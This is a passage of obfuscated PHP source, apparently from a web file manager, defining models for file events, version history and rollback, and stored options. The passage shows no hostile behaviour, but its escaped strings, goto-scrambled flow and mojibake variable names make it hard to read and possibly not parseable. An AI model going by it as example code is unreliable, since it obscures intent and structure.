"\x69\x6f\x5f\x73\157\165\x72\x63\x65\137\x65\x76\x65\156\164"; protected $dataAuto = array(array("\x63\162\145\141\164\145\x54\x69\155\145", "\164\151\155\145", "\151\156\163\x65\x72\x74", "\x66\165\x6e\x63\x74\151\x6f\x6e"), array("\x64\145\163\143", '', "\x69\x6e\163\x65\x72\164\54\165\160\x64\141\x74\x65\54\x73\145\154\145\143\x74", "\x6a\163\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($fÌ™âµ≠ö√, $Fßåÿ†êô“, $eØ§ÜÏ°Úƒ = '') { goto AÇœº‘ÜÀ√; dËæÉ∫´Â€: $Eíëê◊Ï°„ = array($cÊ‹≤ÂΩøÂ[388] => $fÌ™âµ≠ö√, $cÊ‹≤ÂΩøÂ[2226] => $BÖƒ™òà…ú[$cÊ‹≤ÂΩøÂ[465]], $cÊ‹≤ÂΩøÂ[2227] => $BÖƒ™òà…ú[$cÊ‹≤ÂΩøÂ[28]], $cÊ‹≤ÂΩøÂ[470] => $BÖƒ™òà…ú[$cÊ‹≤ÂΩøÂ[470]], $cÊ‹≤ÂΩøÂ[1388] => USER_ID, $cÊ‹≤ÂΩøÂ[393] => $Fßåÿ†êô“, $cÊ‹≤ÂΩøÂ[1390] => $eØ§ÜÏ°Úƒ); $this->addSystemLog($Fßåÿ†êô“, $Eíëê◊Ï°„); return $this->add($Eíëê◊Ï°„); goto B°êÛØìñÔ; AÇœº‘ÜÀ√: $cÊ‹≤ÂΩøÂ =& $_SERVER[Æ¡î¢≠¯™]; if (!$this->eventSave) { return; } $BÖƒ™òà…ú = Model($cÊ‹≤ÂΩøÂ[1096])->sourceInfo($fÌ™âµ≠ö√); goto bÉÑı˘¿‚Î; bÉÑı˘¿‚Î: if (!$BÖƒ™òà…ú) { return !1; } if ($this->isCacheEvent($BÖƒ™òà…ú, $Fßåÿ†êô“)) { return; } if ($eØ§ÜÏ°Úƒ && is_string($eØ§ÜÏ°Úƒ)) { $eØ§ÜÏ°Úƒ = array($cÊ‹≤ÂΩøÂ[2091] => $eØ§ÜÏ°Úƒ); } goto dËæÉ∫´Â€; B°êÛØìñÔ: } private function addSystemLog($AÔ±ëò∑»ä, $Cê¿‹›ÿå©) { $bä∏∂‚Èæá =& $_SERVER[Æ¡î¢≠¯™]; if ($AÔ±ëò∑»ä == $bä∏∂‚Èæá[2228]) { $AÔ±ëò∑»ä = $Cê¿‹›ÿå©[$bä∏∂‚Èæá[409]][$bä∏∂‚Èæá[2229]]; } else { if (in_array($AÔ±ëò∑»ä, array($bä∏∂‚Èæá[2038], $bä∏∂‚Èæá[2230]))) { $AÔ±ëò∑»ä = $Cê¿‹›ÿå©[$bä∏∂‚Èæá[409]][$bä∏∂‚Èæá[684]]; } } $E±£æâŸÖÑ = array_merge($Cê¿‹›ÿå©, array($bä∏∂‚Èæá[2231] => $Cê¿‹›ÿå©[$bä∏∂‚Èæá[374]], $bä∏∂‚Èæá[2232] => $Cê¿‹›ÿå©[$bä∏∂‚Èæá[2232]])); Model($bä∏∂‚Èæá[2002])->addLog($bä∏∂‚Èæá[2233] . $AÔ±ëò∑»ä, $E±£æâŸÖÑ); } private function isCacheEvent($DÇåç¨±÷Ü, $e´∞åÕÙ£‚) { if ($DÇåç¨±÷Ü[$_SERVER[Æ¡î¢≠¯™][376]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($cƒ’œî‹Üê, $D¯£ùù»Ï®) { $Eè®á§îà‚ =& $_SERVER[Æ¡î¢≠¯™]; $AÉáÎ”Œò = Model($Eè®á§îà‚[1096])->sourceInfo($cƒ’œî‹Üê); $F∫¡Ó À = array($Eè®á§îà‚[2229] => $D¯£ùù»Ï®, $Eè®á§îà‚[28] => $AÉáÎ”Œò[$Eè®á§îà‚[28]]); return $this->addEvent($cƒ’œî‹Üê, $Eè®á§îà‚[2228], $F∫¡Ó À); } public function eventFileEdit($b«ÁîÖ◊¡¿) { $DìÕÉ≤˜’ä =& $_SERVER[Æ¡î¢≠¯™]; $Fπïæü ∂ú = array($DìÕÉ≤˜’ä[2234] => $_SERVER[$DìÕÉ≤˜’ä[2235]], $DìÕÉ≤˜’ä[1707] => strtolower(ACTION)); return $this->addEvent($b«ÁîÖ◊¡¿, $DìÕÉ≤˜’ä[2029], $Fπïæü ∂ú); } public function eventRecycle($aﬂ‡±ãÍπ», $a¶äúæáœÏ) { return $this->addEvent($aﬂ‡±ãÍπ», $_SERVER[Æ¡î¢≠¯™][2230], $a¶äúæáœÏ); } public function eventRemove($BﬁˆÁË–Íº) { $aä›œ¬‰Œ¨ =& $_SERVER[Æ¡î¢≠¯™]; $b⁄ßÎüΩ£Ï = Model($aä›œ¬‰Œ¨[1096])->sourceInfo($BﬁˆÁË–Íº); $Bü˘¶‘Ö€ø = $b⁄ßÎüΩ£Ï[$aä›œ¬‰Œ¨[28]]; return $this->addEvent($b⁄ßÎüΩ£Ï[$aä›œ¬‰Œ¨[465]], $aä›œ¬‰Œ¨[2028], $Bü˘¶‘Ö€ø); } public function eventShare($eÍƒΩ∏Í™€, $a¨ËéÚˆ‘Ò) { return $this->addEvent($eÍƒΩ∏Í™€, $_SERVER[Æ¡î¢≠¯™][2038], $a¨ËéÚˆ‘Ò); } public function eventMove($A»ÜŸÛñÇ , $cÁàÃ˜Ô◊à, $BÈä®πÈ¯ó) { goto c¢óïÙÌŒ”; dÑ≥ÆßÕîÉ: $this->addEvent($cÁàÃ˜Ô◊à, $E¥©À‰Ô÷¶[2240], $DïπœÁã»õ); goto B‘‡∂ã∂ùÜ; e±¬¬Úâ¡Ö: $Aç—⁄¬º‡Æ = $dãçµßÖÃ->sourceInfo($cÁàÃ˜Ô◊à); $Dà√†¬≠™ò = $dãçµßÖÃ->sourceInfo($BÈä®πÈ¯ó); $DïπœÁã»õ = array($E¥©À‰Ô÷¶[992] => $cÁàÃ˜Ô◊à, $E¥©À‰Ô÷¶[2236] => $Aç—⁄¬º‡Æ[$E¥©À‰Ô÷¶[28]], $E¥©À‰Ô÷¶[2237] => $Aç—⁄¬º‡Æ[$E¥©À‰Ô÷¶[470]], $E¥©À‰Ô÷¶[993] => $BÈä®πÈ¯ó, $E¥©À‰Ô÷¶[2238] => $Dà√†¬≠™ò[$E¥©À‰Ô÷¶[28]], $E¥©À‰Ô÷¶[2239] => $Dà√†¬≠™ò[$E¥©À‰Ô÷¶[470]]); goto b©ì∏∑ã≥è; b©ì∏∑ã≥è: $this->addEvent($A»ÜŸÛñÇ , $E¥©À‰Ô÷¶[496], $DïπœÁã»õ); $fË·ó«¯Ìπ = $dãçµßÖÃ->sourceInfo($A»ÜŸÛñÇ ); $DïπœÁã»õ = array($E¥©À‰Ô÷¶[374] => $fË·ó«¯Ìπ[$E¥©À‰Ô÷¶[374]], $E¥©À‰Ô÷¶[28] => $fË·ó«¯Ìπ[$E¥©À‰Ô÷¶[28]]); goto dÑ≥ÆßÕîÉ; c¢óïÙÌŒ”: $E¥©À‰Ô÷¶ =& $_SERVER[Æ¡î¢≠¯™]; $dãçµßÖÃ = Model($E¥©À‰Ô÷¶[1096]); $fË·ó«¯Ìπ = $dãçµßÖÃ->sourceInfo($A»ÜŸÛñÇ ); goto e±¬¬Úâ¡Ö; B‘‡∂ã∂ùÜ: } public function eventCopy($f…ª±ñ†Êƒ) { $this->eventCreate($f…ª±ñ†Êƒ, $_SERVER[Æ¡î¢≠¯™][494]); } public function eventRename($Fú›˘√≥Ûõ, $E§Ï‰ö—˜Ñ, $CÒÆ“†Ë’ç) { $CñÈ¿Èõ‹π =& $_SERVER[Æ¡î¢≠¯™]; $få©«ü‡∑© = array($CñÈ¿Èõ‹π[992] => $E§Ï‰ö—˜Ñ, $CñÈ¿Èõ‹π[993] => $CÒÆ“†Ë’ç); return $this->addEvent($Fú›˘√≥Ûõ, $CñÈ¿Èõ‹π[1108], $få©«ü‡∑©); } public function eventAddComment($CÕıçÃÛ∑Ñ, $eå†¡ßØ°¬) { return $this->addEvent($CÕıçÃÛ∑Ñ, $_SERVER[Æ¡î¢≠¯™][2241], $eå†¡ßØ°¬); } public function eventAddDesc($eÕ“–ªà®Í, $bÆ⁄åÇè¯ª) { return $this->addEvent($eÕ“–ªà®Í, $_SERVER[Æ¡î¢≠¯™][2242], $bÆ⁄åÇè¯ª); } public function listBySource($EÀìëÊ¥é∫) { goto C∏¿˜Êé∂Ö; bíÁ´ÙÑÂ: $d¿¶±Õ§‹œ = $this->eventListParse($d¿¶±Õ§‹œ, $EÀìëÊ¥é∫); show_json($d¿¶±Õ§‹œ); goto f™ã ÍËüØ; D∞√«îõ≥è: if ($Bí—ÉŒ¡ÿÆ[$a∆ÛÛ©Ü±ß[375]] == $a∆ÛÛ©Ü±ß[93]) { $f√ÁˆÑﬂﬂ‰ = Model($a∆ÛÛ©Ü±ß[1096])->listSearchChildren($EÀìëÊ¥é∫, 20000); $f√ÁˆÑﬂﬂ‰[] = $EÀìëÊ¥é∫ . $a∆ÛÛ©Ü±ß[66]; $A‘âëØûå™ = array($a∆ÛÛ©Ü±ß[374] => array($a∆ÛÛ©Ü±ß[7], $f√ÁˆÑﬂﬂ‰)); } $d¿¶±Õ§‹œ = $this->where($A‘âëØûå™)->order($a∆ÛÛ©Ü±ß[2243])->selectPage(); if ($d¿¶±Õ§‹œ[$a∆ÛÛ©Ü±ß[357]][$a∆ÛÛ©Ü±ß[358]] == 0) { $d¿¶±Õ§‹œ[$a∆ÛÛ©Ü±ß[357]][$a∆ÛÛ©Ü±ß[358]] = 1; $d¿¶±Õ§‹œ[$a∆ÛÛ©Ü±ß[360]] = array(array($a∆ÛÛ©Ü±ß[388] => $EÀìëÊ¥é∫, $a∆ÛÛ©Ü±ß[2226] => $Bí—ÉŒ¡ÿÆ[$a∆ÛÛ©Ü±ß[465]], $a∆ÛÛ©Ü±ß[1388] => $Bí—ÉŒ¡ÿÆ[$a∆ÛÛ©Ü±ß[383]], $a∆ÛÛ©Ü±ß[393] => $a∆ÛÛ©Ü±ß[2244], $a∆ÛÛ©Ü±ß[394] => $Bí—ÉŒ¡ÿÆ[$a∆ÛÛ©Ü±ß[194]], $a∆ÛÛ©Ü±ß[1390] => $a∆ÛÛ©Ü±ß[33])); } goto bíÁ´ÙÑÂ; C∏¿˜Êé∂Ö: $a∆ÛÛ©Ü±ß =& $_SERVER[Æ¡î¢≠¯™]; $Bí—ÉŒ¡ÿÆ = Model($a∆ÛÛ©Ü±ß[1096])->sourceInfo($EÀìëÊ¥é∫); $A‘âëØûå™ = array($a∆ÛÛ©Ü±ß[388] => $EÀìëÊ¥é∫); goto D∞√«îõ≥è; f™ã ÍËüØ: } private function eventListParse($aûõï≠Ôﬁ◊, $aŸ‰Íõ‚∞Â) { goto Bå≥√˜∫’Ï; DüÏ‚Æë›œ: $e•üíŒ¬•± = array_unique($e•üíŒ¬•±); $Fâ◊„âÊ˜’ = array_unique(array_to_keyvalue($F€ëôóØ“, $A¶≥ŸÏÁ«Í[33], $A¶≥ŸÏÁ«Í[1397])); $CÆ†ß≤ûÿã = Model($A¶≥ŸÏÁ«Í[481])->userListInfo($Fâ◊„âÊ˜’); goto fÔ∆û£µ‚Ÿ; Bå≥√˜∫’Ï: $A¶≥ŸÏÁ«Í =& $_SERVER[Æ¡î¢≠¯™]; $F€ëôóØ“ = $aûõï≠Ôﬁ◊[$A¶≥ŸÏÁ«Í[360]]; $e•üíŒ¬•± = array_to_keyvalue($F€ëôóØ“, $A¶≥ŸÏÁ«Í[33], $A¶≥ŸÏÁ«Í[374]); goto aê¬Ôê«“ê; aê¬Ôê«“ê: $E≈ê∏õ†Òﬂ = array_to_keyvalue($F€ëôóØ“, $A¶≥ŸÏÁ«Í[33], $A¶≥ŸÏÁ«Í[2232]); foreach ($F€ëôóØ“ as $F™§»˜Û“ò) { $FÉÏﬁ≤´à° = $F™§»˜Û“ò[$A¶≥ŸÏÁ«Í[409]]; if ($F™§»˜Û“ò[$A¶≥ŸÏÁ«Í[29]] == $A¶≥ŸÏÁ«Í[496] && isset($FÉÏﬁ≤´à°[$A¶≥ŸÏÁ«Í[992]])) { $e•üíŒ¬•±[] = $FÉÏﬁ≤´à°[$A¶≥ŸÏÁ«Í[992]] . $A¶≥ŸÏÁ«Í[33]; $e•üíŒ¬•±[] = $FÉÏﬁ≤´à°[$A¶≥ŸÏÁ«Í[993]] . $A¶≥ŸÏÁ«Í[33]; } if ($F™§»˜Û“ò[$A¶≥ŸÏÁ«Í[29]] == $A¶≥ŸÏÁ«Í[2240] && isset($FÉÏﬁ≤´à°[$A¶≥ŸÏÁ«Í[374]])) { $e•üíŒ¬•±[] = $FÉÏﬁ≤´à°[$A¶≥ŸÏÁ«Í[374]] . $A¶≥ŸÏÁ«Í[33]; } } $e•üíŒ¬•± = array_merge($e•üíŒ¬•±, $E≈ê∏õ†Òﬂ, array($aŸ‰Íõ‚∞Â . $A¶≥ŸÏÁ«Í[33])); goto DüÏ‚Æë›œ; cºïÁàªÌÿ: return $aûõï≠Ôﬁ◊; goto A—ıÍÉﬁ·ö; fÔ∆û£µ‚Ÿ: $Báá»Úì®ƒ = Model($A¶≥ŸÏÁ«Í[744])->sourceListInfo($e•üíŒ¬•±, !0); foreach ($F€ëôóØ“ as &$F™§»˜Û“ò) { if ($F™§»˜Û“ò[$A¶≥ŸÏÁ«Í[29]] == $A¶≥ŸÏÁ«Í[496] && isset($F™§»˜Û“ò[$A¶≥ŸÏÁ«Í[409]][$A¶≥ŸÏÁ«Í[992]])) { $F™§»˜Û“ò[$A¶≥ŸÏÁ«Í[409]][$A¶≥ŸÏÁ«Í[992]] = $Báá»Úì®ƒ[$F™§»˜Û“ò[$A¶≥ŸÏÁ«Í[409]][$A¶≥ŸÏÁ«Í[992]]]; $F™§»˜Û“ò[$A¶≥ŸÏÁ«Í[409]][$A¶≥ŸÏÁ«Í[993]] = $Báá»Úì®ƒ[$F™§»˜Û“ò[$A¶≥ŸÏÁ«Í[409]][$A¶≥ŸÏÁ«Í[993]]]; } if ($F™§»˜Û“ò[$A¶≥ŸÏÁ«Í[29]] == $A¶≥ŸÏÁ«Í[2240] && isset($F™§»˜Û“ò[$A¶≥ŸÏÁ«Í[409]][$A¶≥ŸÏÁ«Í[374]])) { $F™§»˜Û“ò[$A¶≥ŸÏÁ«Í[409]][$A¶≥ŸÏÁ«Í[374]] = $Báá»Úì®ƒ[$F™§»˜Û“ò[$A¶≥ŸÏÁ«Í[409]][$A¶≥ŸÏÁ«Í[374]]]; } $F™§»˜Û“ò[$A¶≥ŸÏÁ«Í[396]] = $Báá»Úì®ƒ[$F™§»˜Û“ò[$A¶≥ŸÏÁ«Í[374]]]; $F™§»˜Û“ò[$A¶≥ŸÏÁ«Í[2245]] = $Báá»Úì®ƒ[$F™§»˜Û“ò[$A¶≥ŸÏÁ«Í[2232]]]; if ($F™§»˜Û“ò[$A¶≥ŸÏÁ«Í[29]] == $A¶≥ŸÏÁ«Í[2028]) { $F™§»˜Û“ò[$A¶≥ŸÏÁ«Í[2245]] = $F™§»˜Û“ò[$A¶≥ŸÏÁ«Í[396]]; $F™§»˜Û“ò[$A¶≥ŸÏÁ«Í[2232]] = $F™§»˜Û“ò[$A¶≥ŸÏÁ«Í[2245]][$A¶≥ŸÏÁ«Í[374]]; $F™§»˜Û“ò[$A¶≥ŸÏÁ«Í[396]] = !1; $F™§»˜Û“ò[$A¶≥ŸÏÁ«Í[374]] = $A¶≥ŸÏÁ«Í[33]; } $F™§»˜Û“ò[$A¶≥ŸÏÁ«Í[2198]] = $CÆ†ß≤ûÿã[$F™§»˜Û“ò[$A¶≥ŸÏÁ«Í[1397]]]; } $aûõï≠Ôﬁ◊[$A¶≥ŸÏÁ«Í[360]] = $F€ëôóØ“; goto cºïÁàªÌÿ; A—ıÍÉﬁ·ö: } public function removeBySource($a‘‚¥éøÉö) { $aóñó§ ÎÃ = array($_SERVER[Æ¡î¢≠¯™][388] => $a‘‚¥éøÉö); $this->where($aóñó§ ÎÃ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\x75\162\143\145\137\150\x69\x73\x74\157\x72\x79"; public function addHistory($Eíﬁ” ú™…, $céÜ≥Ü¿‚™ = '') { $d¯êÑ©ßÉÉ =& $_SERVER[Æ¡î¢≠¯™]; $FÈıŒ¿˜á„ = array($d¯êÑ©ßÉÉ[388] => $Eíﬁ” ú™…[$d¯êÑ©ßÉÉ[374]], $d¯êÑ©ßÉÉ[1388] => isset($Eíﬁ” ú™…[$d¯êÑ©ßÉÉ[384]]) ? $Eíﬁ” ú™…[$d¯êÑ©ßÉÉ[384]] : $Eíﬁ” ú™…[$d¯êÑ©ßÉÉ[383]], $d¯êÑ©ßÉÉ[424] => $Eíﬁ” ú™…[$d¯êÑ©ßÉÉ[423]], $d¯êÑ©ßÉÉ[524] => $Eíﬁ” ú™…[$d¯êÑ©ßÉÉ[87]], $d¯êÑ©ßÉÉ[2246] => $céÜ≥Ü¿‚™); $EÊ«ùÁºò‰ = $GLOBALS[$d¯êÑ©ßÉÉ[6]][$d¯êÑ©ßÉÉ[94]][$d¯êÑ©ßÉÉ[2247]]; if ($EÊ«ùÁºò‰ > 1) { $this->historyAutoClear($FÈıŒ¿˜á„[$d¯êÑ©ßÉÉ[374]]); $this->add($FÈıŒ¿˜á„); } Model($d¯êÑ©ßÉÉ[2248])->eventFileEdit($Eíﬁ” ú™…[$d¯êÑ©ßÉÉ[374]]); } private function historyAutoClear($fæÑ∆÷ëÍå) { goto BœëãÜËœÃ; AÇÁƒÁö·ï: $Döé›ø€Èö = array_to_keyvalue($B–“ÊÛ™Ç, $aÇÇ∏”¡€‚[33], $aÇÇ∏”¡€‚[423]); $Döé›ø€Èö = array_slice($Döé›ø€Èö, $búàìﬁèàÒ); if (!$AãÆﬂˆÁ‹ﬂ || !$Döé›ø€Èö) { return; } goto DÈçÍºûü±; BœëãÜËœÃ: $aÇÇ∏”¡€‚ =& $_SERVER[Æ¡î¢≠¯™]; $BÃ¯‹§±ïø = Model($aÇÇ∏”¡€‚[1074])->get($aÇÇ∏”¡€‚[2249]); $F®ÙÈ¯æòó = $GLOBALS[$aÇÇ∏”¡€‚[6]][$aÇÇ∏”¡€‚[94]][$aÇÇ∏”¡€‚[2247]]; goto f∂Ø£≤Ï√˜; f∂Ø£≤Ï√˜: $CƒÔÇîÔãÆ = $BÃ¯‹§±ïø == $aÇÇ∏”¡€‚[2250] ? 3 : $F®ÙÈ¯æòó; if ($F®ÙÈ¯æòó <= 1) { $CƒÔÇîÔãÆ = 1; } $búàìﬁèàÒ = $CƒÔÇîÔãÆ - 1; goto fâ„ıø»Í¯; DÈçÍºûü±: $bîÚ≤˜≥ëà = array($aÇÇ∏”¡€‚[390] => array($aÇÇ∏”¡€‚[7], $AãÆﬂˆÁ‹ﬂ)); $this->where($bîÚ≤˜≥ëà)->delete(); Model($aÇÇ∏”¡€‚[426])->remove($Döé›ø€Èö); goto båà©ô–âê; aÆ¿Ï˜∏≠∆: if (!$B–“ÊÛ™Ç || $búàìﬁèàÒ >= count($B–“ÊÛ™Ç)) { return; } $AãÆﬂˆÁ‹ﬂ = array_to_keyvalue($B–“ÊÛ™Ç, $aÇÇ∏”¡€‚[33], $aÇÇ∏”¡€‚[372]); $AãÆﬂˆÁ‹ﬂ = array_slice($AãÆﬂˆÁ‹ﬂ, $búàìﬁèàÒ); goto AÇÁƒÁö·ï; fâ„ıø»Í¯: if ($búàìﬁèàÒ >= 500) { return; } $bîÚ≤˜≥ëà = array($aÇÇ∏”¡€‚[388] => $fæÑ∆÷ëÍå); $B–“ÊÛ™Ç = $this->field($aÇÇ∏”¡€‚[2251])->where($bîÚ≤˜≥ëà)->order($aÇÇ∏”¡€‚[2243])->select(); goto aÆ¿Ï˜∏≠∆; båà©ô–âê: } public function listData($fÑßÜœùÑä) { goto BòêØëäÈÉ; f©Ÿà«ñƒ„: $A›ÛØ˘Û†è = 3; if ($b≤ü∞‰îè™ == $döäÎ•ÉŸﬂ[2250]) { $fØÃπàèÇÊ[$döäÎ•ÉŸﬂ[360]] = array_slice($fØÃπàèÇÊ[$döäÎ•ÉŸﬂ[360]], 0, $A›ÛØ˘Û†è); $fØÃπàèÇÊ[$döäÎ•ÉŸﬂ[357]] = array($döäÎ•ÉŸﬂ[2253] => 1, $döäÎ•ÉŸﬂ[2254] => 20, $döäÎ•ÉŸﬂ[2255] => 1, $döäÎ•ÉŸﬂ[2256] => count($fØÃπàèÇÊ[$döäÎ•ÉŸﬂ[360]])); } return $fØÃπàèÇÊ; goto BË◊Óôéäè; BòêØëäÈÉ: $döäÎ•ÉŸﬂ =& $_SERVER[Æ¡î¢≠¯™]; $bﬂÁêÒøÓí = array($döäÎ•ÉŸﬂ[388] => $fÑßÜœùÑä); $B‰ê≥Êã»µ = $döäÎ•ÉŸﬂ[2252]; goto cÎâÀÌãèü; cÎâÀÌãèü: $fØÃπàèÇÊ = $this->field($B‰ê≥Êã»µ)->where($bﬂÁêÒøÓí)->order($döäÎ•ÉŸﬂ[2243])->selectPage(); $this->_listAppendUser($fØÃπàèÇÊ[$döäÎ•ÉŸﬂ[360]]); $b≤ü∞‰îè™ = Model($döäÎ•ÉŸﬂ[1074])->get($döäÎ•ÉŸﬂ[2249]); goto f©Ÿà«ñƒ„; BË◊Óôéäè: } protected function _listAppendUser(&$b¿¥ΩùãÒƒ) { $Eâ£πΩΩÓ· =& $_SERVER[Æ¡î¢≠¯™]; $AÙ¬ö“ë…Ú = array_to_keyvalue($b¿¥ΩùãÒƒ, $Eâ£πΩΩÓ·[33], $Eâ£πΩΩÓ·[1397]); $e≤∂ÿß†øë = Model($Eâ£πΩΩÓ·[481])->userListInfo($AÙ¬ö“ë…Ú); foreach ($b¿¥ΩùãÒƒ as &$F—á≠‘◊ãá) { $Fé∏√ˆ∂¯Ë = $F—á≠‘◊ãá[$Eâ£πΩΩÓ·[1397]]; $F—á≠‘◊ãá[$Eâ£πΩΩÓ·[383]] = $e≤∂ÿß†øë[$Fé∏√ˆ∂¯Ë] ? $e≤∂ÿß†øë[$Fé∏√ˆ∂¯Ë] : !1; } } public function fileInfo($aë†öùÂòï) { $Bì¯ﬁΩÁ†Ω =& $_SERVER[Æ¡î¢≠¯™]; $Bõ∑æÜø–⁄ = $this->tablePrefix; $dı ›∞ùÜ– = "{$Bõ∑æÜø–⁄}\151\x6f\x5f\x66\151\154\x65\40\x66\151\154\145\163\x20\157\x6e\40\146\151\154\145\x73\x2e\x66\151\x6c\x65\x49\x44\40\75\x20\150\151\x73\x74\157\x72\x79\56\146\151\154\x65\x49\x44"; return $this->alias($Bì¯ﬁΩÁ†Ω[2257])->where(array($Bì¯ﬁΩÁ†Ω[390] => $aë†öùÂòï))->join($dı ›∞ùÜ–, $Bì¯ﬁΩÁ†Ω[2258])->find(); } public function removeItem($AØÍ≤øâ¡´) { $a∞ØÉ»®ÆÜ =& $_SERVER[Æ¡î¢≠¯™]; $A€ö•çÚß’ = array($a∞ØÉ»®ÆÜ[390] => $AØÍ≤øâ¡´); $Fá¢åı¶πÓ = $this->where($A€ö•çÚß’)->find(); if ($Fá¢åı¶πÓ) { $A≤€∆òª“œ = $this->where($A€ö•çÚß’)->delete(); Model($a∞ØÉ»®ÆÜ[426])->remove($Fá¢åı¶πÓ[$a∞ØÉ»®ÆÜ[423]]); return $A≤€∆òª“œ; } return !1; } public function removeBySource($Aı‰ã∏ÿÜ∫) { goto BØÊùñé¡°; A´û¥§¿≈‘: return !0; goto Aæá¢£ÑÂë; BØÊùñé¡°: $C©äÕËÉ§ =& $_SERVER[Æ¡î¢≠¯™]; if (!$Aı‰ã∏ÿÜ∫) { return !1; } if (!is_array($Aı‰ã∏ÿÜ∫)) { $Aı‰ã∏ÿÜ∫ = array($Aı‰ã∏ÿÜ∫); } goto aÂÖí±•ËÆ; aÂÖí±•ËÆ: $EÛâå‰£àè = array($C©äÕËÉ§[388] => array($C©äÕËÉ§[7], $Aı‰ã∏ÿÜ∫)); $báõÉﬂÎâ¨ = $this->field($C©äÕËÉ§[424])->where($EÛâå‰£àè)->select(); if ($báõÉﬂÎâ¨) { $this->where($EÛâå‰£àè)->delete(); $b√·◊ä÷«ú = array_to_keyvalue($báõÉﬂÎâ¨, $C©äÕËÉ§[33], $C©äÕËÉ§[423]); Model($C©äÕËÉ§[426])->remove($b√·◊ä÷«ú); } goto A´û¥§¿≈‘; Aæá¢£ÑÂë: } public function setDetail($b»˘ˆ∂”ˆ©, $b…ŒêªªÎÿ) { $dﬁàß¿à‹á =& $_SERVER[Æ¡î¢≠¯™]; return $this->where(array($dﬁàß¿à‹á[390] => $b»˘ˆ∂”ˆ©))->save(array($dﬁàß¿à‹á[2246] => $b…ŒêªªÎÿ)); } public function rollbackToItem($FÇää∫ïüÂ, $AêÜã€πÙØ) { goto EëñóéÆ¯π; Eû⁄ÍÃÁô«: $bŸ¯èÆÍçÿ = $this->find($AêÜã€πÙØ); $E¡é»∞∞ ¯ = array($BÇ›ãú˘ù≤[423] => $bŸ¯èÆÍçÿ[$BÇ›ãú˘ù≤[423]], $BÇ›ãú˘ù≤[87] => $bŸ¯èÆÍçÿ[$BÇ›ãú˘ù≤[87]], $BÇ›ãú˘ù≤[117] => time(), $BÇ›ãú˘ù≤[384] => USER_ID); Model($BÇ›ãú˘ù≤[744])->where(array($BÇ›ãú˘ù≤[374] => $FÇää∫ïüÂ))->save($E¡é»∞∞ ¯); goto E∫‡Ò≤ûá∏; E∫‡Ò≤ûá∏: return $this->where(array($BÇ›ãú˘ù≤[390] => $AêÜã€πÙØ))->delete(); goto BÑ’Ê√Û©Ü; EëñóéÆ¯π: $BÇ›ãú˘ù≤ =& $_SERVER[Æ¡î¢≠¯™]; $aÁÎÜíØÒœ = Model($BÇ›ãú˘ù≤[744])->sourceInfo($FÇää∫ïüÂ); $this->addHistory($aÁÎÜíØÒœ); goto Eû⁄ÍÃÁô«; BÑ’Ê√Û©Ü: } public function clearSame($c„ÀÌüå•È) { goto eûﬁ°æû˜ª; C¿ëúÍ·—: if (!$fÒ–É«ÿ∫≠) { return; } $this->where(array($DÌà›çáâ“[372] => array($DÌà›çáâ“[7], $fÒ–É«ÿ∫≠)))->delete(); Model($DÌà›çáâ“[426])->remove($b±˘’∞¢©‹); goto f“Ò≥Ô∞…‘; f÷∑ç£Ù¶ê: $b±˘’∞¢©‹ = array(); $fÒ–É«ÿ∫≠ = array(); foreach ($aΩêâ´ÈÇó as $aƒùÇñé™‚) { if (!$aƒùÇñé™‚ || count($aƒùÇñé™‚) <= 1) { continue; } foreach ($aƒùÇñé™‚ as $Aîà¿Éôÿ¿) { $b±˘’∞¢©‹[] = $Aîà¿Éôÿ¿[$DÌà›çáâ“[423]]; $fÒ–É«ÿ∫≠[] = $Aîà¿Éôÿ¿[$DÌà›çáâ“[372]]; } } goto C¿ëúÍ·—; eûﬁ°æû˜ª: $DÌà›çáâ“ =& $_SERVER[Æ¡î¢≠¯™]; $f—¨ßùúºÆ = $this->listData($c„ÀÌüå•È); $aΩêâ´ÈÇó = array_to_keyvalue_group($f—¨ßùúºÆ, $DÌà›çáâ“[423]); goto f÷∑ç£Ù¶ê; f“Ò≥Ô∞…‘: } public function userSpace() { $EÑ£óÀ·≤Œ =& $_SERVER[Æ¡î¢≠¯™]; $f€„õØö∫õ = $this->tablePrefix; $F∂ä…ã‘ÒÔ = array($EÑ£óÀ·≤Œ[1388] => USER_ID); $aã÷÷Ì‡Ù” = "{$f€„õØö∫õ}\151\x6f\x5f\x66\151\x6c\145\x20\x66\x69\154\x65\163\40\157\156\40\146\151\154\x65\x73\x2e\x66\x69\154\x65\x49\104\40\75\40\150\x69\163\x74\x6f\x72\x79\x2e\146\151\x6c\x65\x49\x44"; return $this->alias($EÑ£óÀ·≤Œ[2257])->where($F∂ä…ã‘ÒÔ)->join($aã÷÷Ì‡Ù”, $EÑ£óÀ·≤Œ[2258])->sum($EÑ£óÀ·≤Œ[87]); } } goto A‡«∞–Éæ–; Aó¢ñº∂ÁÒ: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($EáØå≠ä™œ = false, $AÚà·√ëå¿ = '', $F‡Â´˘èÑã = false) { goto dÊ¬Ö¥…Ê–; dÊ¬Ö¥…Ê–: $f§Ç‰≤”„â =& $_SERVER[Æ¡î¢≠¯™]; $D∏–ã’ºÇí = $this->cacheGet($AÚà·√ëå¿); $e„”â¶„æˆ = $this->optionDefault($AÚà·√ëå¿); goto a¨§Êè¬ûç; b˜†¶Âô”“: $this->cacheSet($AÚà·√ëå¿, $D∏–ã’ºÇí); $D∏–ã’ºÇí = array_merge($e„”â¶„æˆ, $D∏–ã’ºÇí); return $EáØå≠ä™œ ? $D∏–ã’ºÇí[$EáØå≠ä™œ] : $D∏–ã’ºÇí; goto Cè‰ÿÈä“¨; DóøÚÌ∂ùÃ: $D∏–ã’ºÇí = $this->where($aŒê°ûºûí)->select(); $D∏–ã’ºÇí = array_to_keyvalue($D∏–ã’ºÇí, $f§Ç‰≤”„â[99], $f§Ç‰≤”„â[365]); foreach ($D∏–ã’ºÇí as $D’É≠—≈˜¢ => $a“çê¶òπÇ) { if ($F‡Â´˘èÑã || in_array($D’É≠—≈˜¢, $this->jsonField)) { $D∏–ã’ºÇí[$D’É≠—≈˜¢] = json_decode($a“çê¶òπÇ, !0); } } goto b˜†¶Âô”“; a¨§Êè¬ûç: $e„”â¶„æˆ = is_array($e„”â¶„æˆ) ? $e„”â¶„æˆ : array(); if (is_array($D∏–ã’ºÇí)) { $D∏–ã’ºÇí = 